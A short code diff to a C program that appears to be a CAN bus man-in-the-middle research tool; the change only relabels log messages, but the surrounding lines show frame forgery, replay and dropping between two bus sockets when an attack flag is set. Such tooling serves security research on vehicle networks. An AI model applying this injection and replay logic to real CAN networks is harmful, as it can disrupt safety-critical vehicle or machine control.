@@ -32,7 +32,7 @@ static void can_rx_cb (struct ev_loop *loop, ev_io *w, int revents)
 
 				/* (5.1.3) */
 				struct can_frame m = { .can_id = 0x103, .can_dlc = 8, .data = {0x40, 0x02, 0, 0, 0, 0, 0, 0} };
-				print_frame(ctx, &m, "!!! REPLACED WITH");
+				print_frame(ctx, &m, "### REPLACED WITH");
 				write(sock_j, &m, sizeof(m));
 				continue;
 			}
@@ -42,7 +42,7 @@ static void can_rx_cb (struct ev_loop *loop, ev_io *w, int revents)
 				struct can_frame m = cf;
 				m.can_id = 0x103;
 				//m.data[0] = 0x82;
-				print_frame(ctx, &m, "!!! REPLAY AS j");
+				print_frame(ctx, &m, "### REPLAY AS j");
 				write(sock_j, &m, sizeof(m));
 				continue;
 			}
@@ -50,9 +50,9 @@ static void can_rx_cb (struct ev_loop *loop, ev_io *w, int revents)
 		} else if (w->fd == sock_j) {
 			if (attack && cf.can_id == 0x100 && cf.data[0] == 0x02 && cf.data[1] == 0x03) {
 				/* (5.1.6) */
-				printf("!!! REMOVED\n");
+				printf("### REMOVED\n");
 				/* (5.1.7) */
-				print_frame(ctx, &remember_ch_i, "!!! REPLAYED");
+				print_frame(ctx, &remember_ch_i, "### REPLAYED");
 				write(sock_j, &remember_ch_i, sizeof(cf));
 				continue;
 			}
